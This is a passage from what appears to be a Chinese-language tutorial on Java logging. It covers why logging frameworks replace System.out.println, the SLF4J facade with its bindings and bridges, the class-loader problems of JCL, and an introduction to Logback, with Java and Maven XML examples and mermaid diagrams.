<h4 id="1-1-4-替代-System-out-println-的理由"><a href="#1-1-4-替代-System-out-println-的理由" class="headerlink" title="1.1.4 替代 System.out.println 的理由"></a>1.1.4 替代 <code>System.out.println</code> 的理由</h4><p><code>System.out.println</code> 虽然简单直观，但在生产级别的项目中，使用它是<strong>极其不专业</strong>的。</p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left"><code>System.out.println</code></th>
<th align="left">日志框架 (如 Logback, Log4j2)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>1. 可控制性</strong></td>
<td align="left"><strong>无法控制</strong>。一旦写入代码，要么输出，要么不输出。想在–生产环境关闭它，必须修改代码并重新部署 。</td>
<td align="left"><strong>完全可配</strong>。通过配置文件可以动态修改日志级别，无需改动代码即可控制哪些日志需要输出，哪些需要屏蔽。</td>
</tr>
<tr>
<td align="left"><strong>2. 日志级别</strong></td>
<td align="left"><strong>没有级别</strong>。所有输出信息都混在一起，无法区分是普通的调试信息还是致命的错误。</td>
<td align="left"><strong>分级管理</strong>。提供 <code>TRACE</code>, <code>DEBUG</code>, <code>INFO</code>, <code>WARN</code>, <code>ERROR</code> 等级别，可以为不同环境（开发、生产）设置不同输出级别。</td>
</tr>
<tr>
<td align="left"><strong>3. 性能开销</strong></td>
<td align="left"><strong>性能差</strong>。<code>System.out</code> 是一个同步的阻塞IO操作，在高并发下会成为严重的性能瓶颈，拖慢整个应用。</td>
<td align="left"><strong>高性能</strong>。提供异步日志、缓冲区等机制，将日志写入操作与主业务线程解耦，对应用性能影响极小。</td>
</tr>
<tr>
<td align="left"><strong>4. 输出格式</strong></td>
<td align="left"><strong>格式单一</strong>。只能输出原始字符串，无法附加额外信息。</td>
<td align="left"><strong>格式灵活</strong>。通过 <code>Layout</code> 或 <code>Encoder</code> 可以自定义输出格式，自动添加时间戳、线程名、类名、行号、MDC上下文信息等。</td>
</tr>
<tr>
<td align="left"><strong>5. 输出目标</strong></td>
<td align="left"><strong>目标单一</strong>。默认只能输出到控制台（标准输出）。</td>
<td align="left"><strong>目标多样</strong>。通过 <code>Appender</code> 可以将日志同时输出到多个目的地：控制台、文件、滚动文件、数据库、Kafka、远程日志服务器等。</td>
</tr>
<tr>
<td align="left"><strong>6. 上下文信息</strong></td>
<td align="left"><strong>无上下文</strong>。无法方便地将一次请求的所有日志关联起来。</td>
<td align="left"><strong>支持上下文</strong>。提供MDC（Mapped Diagnostic Context）等功能，可以轻松地为同一线程&#x2F;请求的所有日志添加唯一标识（如 <code>TraceID</code>），极大地方便了分布式系统中的链路追踪。</td>
</tr>
</tbody></table>
<hr>
<h3 id="1-2-日志门面-Logging-Facade-vs-日志实现-Logging-Implementation"><a href="#1-2-日志门面-Logging-Facade-vs-日志实现-Logging-Implementation" class="headerlink" title="1.2 日志门面 (Logging Facade) vs. 日志实现 (Logging Implementation)"></a>1.2 日志门面 (Logging Facade) vs. 日志实现 (Logging Implementation)</h3><p>在Java的日志世界中，分为两大部分：<strong>日志门面</strong>和<strong>日志实现</strong>。这是一种典型的**“面向接口编程”<strong>思想的体现，其核心目标是</strong>解耦**。</p>
<h4 id="1-2-1-解耦的重要性：门面模式与JDBC类比"><a href="#1-2-1-解耦的重要性：门面模式与JDBC类比" class="headerlink" title="1.2.1 解耦的重要性：门面模式与JDBC类比"></a>1.2.1 解耦的重要性：门面模式与JDBC类比</h4><h5 id="1-问题的根源：紧密耦合"><a href="#1-问题的根源：紧密耦合" class="headerlink" title="1. 问题的根源：紧密耦合"></a>1. 问题的根源：紧密耦合</h5><p>如果我们的应用程序代码直接依赖于一个具体的日志实现库，比如Log4j 2。代码中会充满这样的引用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyService</span> &#123;</span><br><span class="line">    <span class="comment">// 直接获取Log4j 2的Logger实例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(MyService.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span> &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;开始执行任务...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这会导致两个严重的问题：</p>
<ul>
<li><strong>更换成本高</strong>：如果有一天我们发现Logback在某些场景下性能更好，或者公司决定统一技术栈到Logback，我们将被迫修改项目中<strong>每一个</strong>使用到日志的Java类，把 <code>import</code> 语句和获取<code>Logger</code>的方式全部更换一遍。对于大型项目而言，这是一场灾难。</li>
<li><strong>依赖冲突与混乱</strong>：我们的项目通常会依赖很多第三方库（如Spring, Hibernate, Dubbo等）。如果我们的项目用Log4j 2，而某个依赖库A用了Logback，另一个依赖库B用了JUL，那么整个应用的classpath下就会同时存在三套日志实现。这会导致所谓的“<strong>日志孤岛</strong>”：<ul>
<li>需要维护多份配置文件 (<code>log4j2.xml</code>, <code>logback.xml</code>, <code>logging.properties</code>)。</li>
<li>日志输出格式和路径难以统一管理。</li>
<li>排查问题时，可能需要查看多个不同的日志文件。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="2-解决方案：门面模式-Facade-Pattern"><a href="#2-解决方案：门面模式-Facade-Pattern" class="headerlink" title="2. 解决方案：门面模式 (Facade Pattern)"></a>2. 解决方案：门面模式 (Facade Pattern)</h5><p>为了解决上述问题，日志领域引入了<strong>门面模式</strong>。它的作用就像是为一个复杂的系统提供一个简单、统一的入口。客户端（我们的应用程序）只需要与这个简单的门面打交道，而无需关心背后复杂的实现细节。</p>
<hr>
<h5 id="3-绝佳类比"><a href="#3-绝佳类比" class="headerlink" title="3. 绝佳类比"></a>3. 绝佳类比</h5><p>我们在之前其实就接触过了面向接口编程的案例——<strong>JDBC (Java Database Connectivity)</strong>。</p>
<ul>
<li><strong>JDBC API <strong>：这就是</strong>门面</strong>。Java官方定义了一套标准的接口，如 <code>Connection</code>, <code>Statement</code>, <code>ResultSet</code>。我们的应用程序代码（业务逻辑）只针对这些标准接口进行编程，我们写的DAO层代码并不知道底层用的是MySQL还是Oracle。</li>
<li><strong>数据库驱动</strong>：这就是<strong>实现</strong>。它们是各大数据库厂商提供的、遵循JDBC规范的具体实现。它们才是真正负责与数据库进行网络通信的“工人”。</li>
</ul>
<p><strong>切换数据库时，我们做什么？</strong> 我们只需要在项目的依赖管理（如Maven的<code>pom.xml</code>）中更换不同的数据库驱动<code>jar</code>包，并修改一下连接配置字符串。<strong>我们的业务代码一行都不需要改！</strong></p>
<p>日志门面与日志实现的关系，与JDBC和数据库驱动的关系<strong>完全一致</strong>。</p>
<hr>
<h4 id="1-2-2-日志门面与日志实现的角色分工"><a href="#1-2-2-日志门面与日志实现的角色分工" class="headerlink" title="1.2.2 日志门面与日志实现的角色分工"></a>1.2.2 日志门面与日志实现的角色分工</h4><p>基于门面模式，日志生态被清晰地划分为两个角色：</p>
<ul>
<li><p><strong>日志门面 (Logging Facade) - “API标准制定者”</strong></p>
<p>日志门面定义了一套<strong>通用的日志API接口</strong>。它本身不包含任何日志记录的逻辑，它的全部意义在于提供一个统一的、稳定的编程接口。开发者在编写应用时，应该只依赖于日志门面。</p>
<ul>
<li><strong>主流代表</strong>：<ul>
<li><strong>SLF4J (Simple Logging Facade for Java)</strong>：目前业界的<strong>事实标准</strong>，强烈推荐使用。</li>
<li><strong>JCL (Apache Commons Logging)</strong>：一个较老的门面，由于其类加载机制存在一些问题，已不推荐在新项目中使用。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>日志实现 (Logging Implementation) - “日志工作执行者”</strong></p>
<p>日志实现是真正“干活”的库。它负责接收来自日志门面的请求，并根据其自身的配置（如<code>logback.xml</code>）来完成日志的格式化、过滤和输出等所有具体工作。</p>
<ul>
<li><strong>主流代表</strong>：<ul>
<li><strong>Logback</strong>：SLF4J的原生实现，性能优秀，配置强大，与Spring Boot无缝集成。</li>
<li><strong>Log4j 2</strong>：Log4j的继任者，以其超高的异步性能和灵活的插件架构著称。</li>
<li><strong>JUL (java.util.logging)</strong>：JDK自带的日志实现，功能简单，无需额外依赖。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>关系图与工作流程</strong></p>
<pre><code class="highlight mermaid">graph LR
    subgraph &quot;应用程序&quot;
        A[&quot;&lt;b&gt;应用程序代码&lt;/b&gt;&lt;br/&gt;(Your Code)&quot;]
    end

    subgraph &quot;日志门面&quot;
        B[&quot;&lt;b&gt;日志门面 (SLF4J)&lt;/b&gt;&lt;br/&gt;(slf4j-api)&quot;]
    end

    subgraph &quot;日志实现&quot;
        C[&quot;&lt;b&gt;日志实现 (Logback)&lt;/b&gt;&lt;br/&gt;(logback-classic)&quot;]
    end

    subgraph &quot;输出目的地 (Appenders)&quot;
        D[ConsoleAppender]
        E[FileAppender]
    end

    A -- &quot;调用日志API&quot; --&gt; B
    B -- &quot;运行时绑定&quot; --&gt; C
    C -- &quot;配置输出到&quot; --&gt; D
    C -- &quot;配置输出到&quot; --&gt; E

    style A fill:#cde4ff,stroke:#5a96e0
    style B fill:#d5e8d4,stroke:#82b366
    style C fill:#fff2cc,stroke:#d6b656
    style D fill:#f5f5f5,stroke:#666
    style E fill:#f5f5f5,stroke:#666</code></pre>

<p><strong>工作流程如下：</strong></p>
<ol>
<li><strong>编程时</strong>：你的代码中引入并调用 <code>org.slf4j.Logger</code> 和 <code>org.slf4j.LoggerFactory</code>。</li>
<li><strong>编译时</strong>：你的代码只依赖于<code>slf4j-api.jar</code>。</li>
<li><strong>运行时</strong>：SLF4J会通过其<strong>绑定机制</strong>，在应用的<code>classpath</code>中寻找一个具体的日志实现库（例如，它会寻找<code>logback-classic.jar</code>）。</li>
<li><strong>执行时</strong>：一旦找到绑定，SLF4J就会将所有日志API的调用“桥接”或“委派”给这个日志实现库。最终，由Logback来负责完成日志的输出。</li>
</ol>
</li>
</ul>
<p>通过这种方式，我们实现了应用层代码与具体日志实现框架的<strong>优雅解耦</strong>。更换日志实现就像更换JDBC驱动一样简单，只需调整项目依赖即可，应用程序代码稳如泰山。</p>
<hr>
<h2 id="2-主流日志门面"><a href="#2-主流日志门面" class="headerlink" title="2. 主流日志门面"></a>2. 主流日志门面</h2><h3 id="2-1-SLF4J-Simple-Logging-Facade-for-Java"><a href="#2-1-SLF4J-Simple-Logging-Facade-for-Java" class="headerlink" title="2.1 SLF4J (Simple Logging Facade for Java)"></a>2.1 SLF4J (Simple Logging Facade for Java)</h3><h4 id="2-1-1-简介"><a href="#2-1-1-简介" class="headerlink" title="2.1.1 简介"></a>2.1.1 简介</h4><p><strong>SLF4J</strong>，全称 <strong>Simple Logging Facade for Java</strong>（Java 简单日志门面），是目前 Java 生态中<strong>应用最广泛、最受推崇</strong>的日志门面。它不是一个具体的日志实现方案，而是一套标准的API。它的设计哲学是让应用程序与底层的日志框架彻底解耦，为开发者提供一个稳定、统一的编程接口。</p>
<p>由于其优雅的设计、卓越的性能和强大的生态整合能力，SLF4J 已经成为事实上的行业标准，是所有新项目的<strong>首选</strong>。它的作者 Ceki Gülcü，也正是高性能日志实现框架 Logback 的作者，这保证了两者之间的无缝集成。</p>
<hr>
<h4 id="2-1-2-核心优势"><a href="#2-1-2-核心优势" class="headerlink" title="2.1.2 核心优势"></a>2.1.2 核心优势</h4><h5 id="1-静态绑定与高性能"><a href="#1-静态绑定与高性能" class="headerlink" title="1. 静态绑定与高性能"></a>1. 静态绑定与高性能</h5><p>这与早期的日志门面JCL（Commons Logging）的动态绑定形成了鲜明对比。</p>
<ul>
<li><strong>工作机制</strong>：SLF4J 在应用程序启动时，通过一个简单的机制<strong>一次性地</strong>确定要绑定的具体日志实现。它会在 classpath 中查找一个特定路径下的<code>StaticLoggerBinder</code>类（例如，<code>logback-classic.jar</code>中就包含了这个类）。一旦找到，后续所有的日志调用都会直接委托给这个实现，没有任何中间的动态查找过程。</li>
<li><strong>优势</strong>：<ul>
<li><strong>性能高</strong>：因为绑定在类加载时就已确定，运行期间的日志调用是直接的方法调用，几乎没有额外开销。</li>
<li><strong>行为确定</strong>：避免了 JCL 因复杂类加载器环境（如在Web容器中）导致的“找不到日志实现”或“绑定错误”等难以排查的问题。启动时如果绑定失败，SLF4J会立刻打印清晰的警告信息。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="2-参数化日志（-占位符）"><a href="#2-参数化日志（-占位符）" class="headerlink" title="2. 参数化日志（{} 占位符）"></a>2. 参数化日志（<code>{}</code> 占位符）</h5><p>这是 SLF4J 最为人称道的功能之一，它极大地提升了日志记录的性能和代码的可读性。</p>
<ul>
<li><p><strong>传统方式的问题（字符串拼接）</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 性能不佳的方式</span></span><br><span class="line"><span class="type">String</span> <span class="variable">userId</span> <span class="operator">=</span> <span class="string">&quot;1001&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">orderId</span> <span class="operator">=</span> <span class="number">8088</span>;</span><br><span class="line"><span class="comment">// 即使日志级别不够(如生产环境设为INFO)，字符串拼接依然会执行！</span></span><br><span class="line">logger.debug(<span class="string">&quot;User &quot;</span> + userId + <span class="string">&quot; created order &quot;</span> + orderId);</span><br></pre></td></tr></table></figure>

<p>在上面的代码中，<code>&quot;User &quot; + userId + ...</code> 这个字符串拼接操作无论 <code>debug</code> 级别是否开启，都会被执行，造成不必要的CPU和内存开销。</p>
</li>
<li><p><strong>SLF4J 的优雅解决方案</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 推荐的高性能方式</span></span><br><span class="line"><span class="type">String</span> <span class="variable">userId</span> <span class="operator">=</span> <span class="string">&quot;1001&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">orderId</span> <span class="operator">=</span> <span class="number">8088</span>;</span><br><span class="line"><span class="comment">// 只有在debug级别启用时，才会真正进行字符串格式化</span></span><br><span class="line">logger.debug(<span class="string">&quot;User &#123;&#125; created order &#123;&#125;&quot;</span>, userId, orderId);</span><br></pre></td></tr></table></figure>

<p>SLF4J 的 <code>debug</code> 方法会先内部判断当前 <code>debug</code> 级别是否启用。<strong>如果未启用，方法会直接返回，<code>userId</code> 和 <code>orderId</code> 的 <code>toString()</code> 方法以及字符串格式化操作完全不会发生</strong>。这种“延迟执行”的策略，在高并发和大量日志调用的场景下，可以带来显著的性能提升。</p>
</li>
</ul>
<hr>
<h5 id="3-强大的桥接能力：统一日志江湖"><a href="#3-强大的桥接能力：统一日志江湖" class="headerlink" title="3. 强大的桥接能力：统一日志江湖"></a>3. 强大的桥接能力：统一日志江湖</h5><p>现代项目不可避免地会依赖各种使用不同日志框架的第三方库（例如，某个老库用了 Log4j 1.x，另一个用了 <code>java.util.logging</code>）。SLF4J 通过其“桥接器”（Bridge）模块，可以将这些“异构”的日志调用全部重定向到 SLF4J 门面，再由 SLF4J 统一交给背后唯一的日志实现来处理。</p>
<p>这使得我们能够实现<strong>整个应用（包括所有第三方依赖）使用单一日志配置</strong>的理想状态。</p>
<hr>
<h4 id="2-1-3-核心模块：API、绑定器与桥接器"><a href="#2-1-3-核心模块：API、绑定器与桥接器" class="headerlink" title="2.1.3 核心模块：API、绑定器与桥接器"></a>2.1.3 核心模块：API、绑定器与桥接器</h4><p>理解SLF4J的模块是正确使用它的关键。</p>
<ul>
<li><code>slf4j-api</code> <strong>(核心API)</strong><ul>
<li><strong>作用</strong>：定义了 SLF4J 的核心接口，如 <code>org.slf4j.Logger</code> 和 <code>org.slf4j.LoggerFactory</code>。</li>
<li><strong>用法</strong>：这是项目<strong>唯一需要直接编译依赖</strong>的 SLF4J 模块。业务代码中应该只出现对这个包的引用。</li>
</ul>
</li>
<li><strong>绑定器 (Binding)</strong><ul>
<li><strong>作用</strong>：连接 SLF4J 门面和具体日志实现的“胶水”。</li>
<li><strong>规则</strong>：在一个项目中，<strong>classpath 下必须且只能有一个绑定器</strong>。如果出现零个或多个，SLF4J会在启动时打印警告。</li>
<li><strong>示例</strong>：<ul>
<li><code>logback-classic</code>：绑定到 Logback。（推荐组合）</li>
<li><code>log4j-slf4j-impl</code>：绑定到 Log4j 2。（注意，不是<code>slf4j-log4j2</code>）</li>
<li><code>slf4j-log4j12</code>：绑定到旧版的 Log4j 1.x。</li>
<li><code>slf4j-jdk14</code>：绑定到 <code>java.util.logging</code> (JUL)。</li>
</ul>
</li>
</ul>
</li>
<li><strong>桥接器 (Bridge)</strong><ul>
<li><strong>作用</strong>：将其他日志框架的 API 调用“拦截”并重定向到 SLF4J。它本身伪装成被桥接的日志框架。</li>
<li><strong>规则</strong>：使用桥接器时，<strong>必须从 classpath 中排除掉原始的日志框架实现</strong>，否则会造成无限循环调用（例如，<code>log4j-over-slf4j</code> 拦截 Log4j 调用并转给 SLF4J，SLF4J 又通过 <code>slf4j-log4j12</code> 绑定器转回给 Log4j）。</li>
<li><strong>示例</strong>：<ul>
<li><code>jcl-over-slf4j</code>：将 Commons Logging 调用桥接到 SLF4J。</li>
<li><code>log4j-over-slf4j</code>：将 Log4j 1.x 调用桥接到 SLF4J。</li>
<li><code>jul-to-slf4j</code>：将 <code>java.util.logging</code> 调用桥接到 SLF4J。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>一张图理解它们的关系：</strong></p>
<pre><code class="highlight mermaid">graph LR
    %% 定义样式
    classDef lib fill:#E6F3FF,stroke:#006DCC,stroke-width:2px;
    classDef api fill:#FFF2CC,stroke:#D6B656,stroke-width:1px;
    classDef bridge fill:#D5E8D4,stroke:#82B366,stroke-width:2px;
    classDef app fill:#DAE8FC,stroke:#6C8EBF,stroke-width:2px;
    classDef slf4jCore fill:#F8CECC,stroke:#B85450,stroke-width:3px;
    classDef logback fill:#FFE6CC,stroke:#D79B00,stroke-width:2px;

    %% 定义子图 (Subgraphs)
    subgraph 第三方库及其日志API
        LibA[&quot;第三方库 A&quot;]:::lib
        Log4jApi[&quot;Log4j 1.x API&quot;]:::api
        LibB[&quot;第三方库 B&quot;]:::lib
        JclApi[&quot;JCL API&quot;]:::api
        LibC[&quot;第三方库 C&quot;]:::lib
        JulApi[&quot;JUL API&quot;]:::api
    end

    subgraph &quot;SLF4J桥接层[SLF4J 桥接层 (Bridges)]&quot;
        Log4jBridge[&quot;log4j-over-slf4j&quot;]:::bridge
        JclBridge[&quot;jcl-over-slf4j&quot;]:::bridge
        JulBridge[&quot;jul-to-slf4j&quot;]:::bridge
    end

    subgraph 你的应用与SLF4J
        MyApp[&quot;你的应用代码&quot;]:::app
        Slf4jApi[&quot;slf4j-api (门面)&quot;]:::api
    end
    
    subgraph &quot;日志实现[日志实现 (Implementation)]&quot;
        LogbackBinding[&quot;logback-classic (绑定)&quot;]:::logback
        LogbackImpl[&quot;Logback 实现&lt;br&gt;(写入文件/控制台等)&quot;]:::logback
        LogbackConfig[&quot;logback.xml&lt;br&gt;(统一配置)&quot;]:::logback
    end

    %% 中心节点
    SLF4J_Core[&quot;SLF4J 核心&quot;]:::slf4jCore

    %% 定义连接关系
    %% 第三方库的日志流
    LibA --&gt;|1.调用| Log4jApi
    Log4jApi --&gt;|2.被桥接| Log4jBridge --&gt;|3.路由到| SLF4J_Core

    LibB --&gt;|1.调用| JclApi
    JclApi --&gt;|2.被桥接| JclBridge --&gt;|3.路由到| SLF4J_Core

    LibC --&gt;|1.调用| JulApi
    JulApi --&gt;|2.被拦截| JulBridge --&gt;|3.路由到| SLF4J_Core

    %% 你的应用的日志流
    MyApp --&gt;|A. 调用| Slf4jApi --&gt;|B.委托给| SLF4J_Core

    %% SLF4J核心到最终实现
    SLF4J_Core --&gt;|4.发现并绑定| LogbackBinding
    LogbackBinding --&gt;|5.执行日志记录| LogbackImpl
    LogbackConfig -.-&gt;|6.配置| LogbackBinding</code></pre>

<hr>
<h3 id="2-2-JCL-Apache-Commons-Logging"><a href="#2-2-JCL-Apache-Commons-Logging" class="headerlink" title="2.2 JCL (Apache Commons Logging)"></a>2.2 JCL (Apache Commons Logging)</h3><h4 id="2-2-1-简介"><a href="#2-2-1-简介" class="headerlink" title="2.2.1 简介"></a>2.2.1 简介</h4><p><strong>JCL (Apache Commons Logging)</strong> 是一个早期出现的、非常著名的日志门面。在 SLF4J 尚未普及的年代，它被视为解决日志实现多样性问题的重要方案，并被许多重量级框架（如 <strong>Spring Framework 早期版本</strong>、Hibernate 等）所采用。</p>
<p>它的初衷和 SLF4J 类似：提供一个统一的日志 API，让应用程序代码可以独立于具体的日志实现库（如 Log4j 1.x 或 <code>java.util.logging</code>）。开发者只需面向 JCL 的 <code>Log</code> 和 <code>LogFactory</code> 接口编程。</p>
<hr>
<h4 id="2-2-2-核心问题：运行时动态绑定与类加载器噩梦"><a href="#2-2-2-核心问题：运行时动态绑定与类加载器噩梦" class="headerlink" title="2.2.2 核心问题：运行时动态绑定与类加载器噩梦"></a>2.2.2 核心问题：运行时动态绑定与类加载器噩梦</h4><p>JCL 最大的问题，也是其最终被 SLF4J 取代的核心原因，在于其<strong>复杂的运行时动态发现机制</strong>。</p>
<h5 id="1-动态绑定过程"><a href="#1-动态绑定过程" class="headerlink" title="1. 动态绑定过程"></a>1. 动态绑定过程</h5><p>与 SLF4J 的静态绑定不同，JCL 在<strong>每次</strong>应用程序需要获取一个 <code>Log</code> 实例时，都会执行一套复杂的查找算法来动态地决定使用哪个日志实现。这个过程大致如下：</p>
<ol>
<li>检查 <code>org.apache.commons.logging.Log</code> 系统属性是否被设置。</li>
<li>在当前线程的上下文类加载器（Thread Context ClassLoader）的 classpath 中查找并使用 <code>META-INF/services/org.apache.commons.logging.Log</code> 文件中定义的实现。</li>
<li>如果以上都找不到，JCL 会尝试在 classpath 中按顺序探测是否存在特定的日志实现库：<ul>
<li>首先，查找 Log4j 1.x。</li>
<li>然后，查找 <code>java.util.logging</code> (JUL)。</li>
<li>最后，如果都找不到，使用 JCL 自带的一个极其简单的 <code>SimpleLog</code> 实现。</li>
</ul>
</li>
</ol>
<hr>
<h5 id="2-带来的问题：著名的“类加载器地狱”-ClassLoader-Hell"><a href="#2-带来的问题：著名的“类加载器地狱”-ClassLoader-Hell" class="headerlink" title="2. 带来的问题：著名的“类加载器地狱” (ClassLoader Hell)"></a>2. 带来的问题：著名的“类加载器地狱” (ClassLoader Hell)</h5><p>这种动态发现机制在简单的应用中或许工作良好，但在复杂的、分层类加载器环境（如 Tomcat、JBoss 等 Web 容器）中，常常会引发各种难以诊断的诡异问题，这就是开发者口中的**“JCL 类加载器地狱”**。</p>
<ul>
<li><strong>不确定性</strong>：在不同的部署环境或启动顺序下，JCL 可能会绑定到不同的日志实现上，导致日志行为不一致。例如，在本地 IDE 运行正常，但部署到 Tomcat 上后，日志却无法输出到预期的文件，因为 Tomcat 的类加载器结构导致 JCL 意外地绑定到了 JUL 而非 Log4j。</li>
<li><strong>诊断困难</strong>：当出现问题时，很难确定 JCL 到底绑定到了哪个日志实现。出错信息往往非常模糊，开发者需要深入理解 Java 类加载机制才能进行排查，耗时耗力。</li>
<li><strong>内存泄漏风险</strong>：在热部署&#x2F;热加载的场景下（如在 Web 容器中重新部署应用而不重启服务器），JCL 的动态绑定机制可能导致对旧版本的日志实现实例的引用无法被垃圾回收，从而引发<strong>内存泄漏</strong>。</li>
</ul>
<p>此外，JCL 的 API 设计也不如 SLF4J 现代，它<strong>不支持参数化占位符</strong>，开发者只能进行字符串拼接，存在性能隐患。</p>
<hr>
<h4 id="2-2-3-当前定位：兼容与过渡"><a href="#2-2-3-当前定位：兼容与过渡" class="headerlink" title="2.2.3 当前定位：兼容与过渡"></a>2.2.3 当前定位：兼容与过渡</h4><p>鉴于上述问题，JCL 已经不再是现代 Java 开发的推荐选择。</p>
<ul>
<li><strong>不推荐在新项目中使用</strong>：对于所有新启动的项目，应当<strong>直接采用 <code>SLF4J + Logback/Log4j2</code> 的组合</strong>，完全避开 JCL。</li>
<li><strong>兼容老旧第三方库</strong>：JCL 的主要价值在于<strong>向后兼容</strong>。由于许多老旧但仍在使用的第三方库内部依赖了 JCL，我们的项目不得不处理它。最佳实践是<strong>不直接使用 JCL</strong>，而是通过 SLF4J 提供的<strong>桥接器 <code>jcl-over-slf4j</code></strong> 来接管它。</li>
</ul>
<p><strong>处理策略：</strong></p>
<ol>
<li><p>在你的项目依赖中，明确<strong>排除</strong>掉所有传递性依赖进来的 <code>commons-logging</code> 包。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在 Maven pom.xml 中排除 commons-logging --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>some.old.library<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>some-artifact<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>同时，在你的项目中添加 <code>jcl-over-slf4j</code> 依赖。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;slf4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>这样一来，当老旧的第三方库尝试调用 JCL 的 API 时，<code>jcl-over-slf4j</code> 会“冒充” JCL，拦截这些调用，然后将它们无缝地转发给 SLF4J 门面，最终交由你项目统一配置的 Logback 或 Log4j 2 来处理。这是一种非常优雅的“偷梁换柱”策略，可以让我们在享受 SLF4J 强大功能的同时，平稳地兼容历史遗留系统。</p>
<hr>
<h2 id="3-主流日志实现"><a href="#3-主流日志实现" class="headerlink" title="3. 主流日志实现"></a>3. 主流日志实现</h2><h3 id="3-1-Logback"><a href="#3-1-Logback" class="headerlink" title="3.1 Logback"></a>3.1 Logback</h3><h4 id="3-1-1-简介"><a href="#3-1-1-简介" class="headerlink" title="3.1.1 简介"></a>3.1.1 简介</h4><p><strong>Logback</strong> 是一个成熟、健壮的日志实现框架，被设计为广受欢迎的 Log4j 1.x 的继任者。它的作者是 Ceki Gülcü，也正是 <strong>SLF4J 的创始人</strong>。这层特殊关系意味着 Logback 是 SLF4J 的<strong>原生实现 (Native Implementation)</strong>。</p>
<p>这种“原生”关系带来了几个好处：</p>
<ul>
<li><strong>无缝集成</strong>：两者之间的协作没有任何性能损耗或兼容性问题，因为它们本就是一体设计的。</li>
<li><strong>快速迭代</strong>：SLF4J 的新特性（如MDC）总能第一时间在 Logback 中得到最完善的支持。</li>
<li><strong>设计理念统一</strong>：都强调高性能、稳定性和易用性。</li>
</ul>
<p>因此，<code>SLF4J + Logback</code> 的组合被视为 Java 日志领域的“黄金搭档”，也是 Spring Boot 默认的日志技术栈。</p>
<hr>
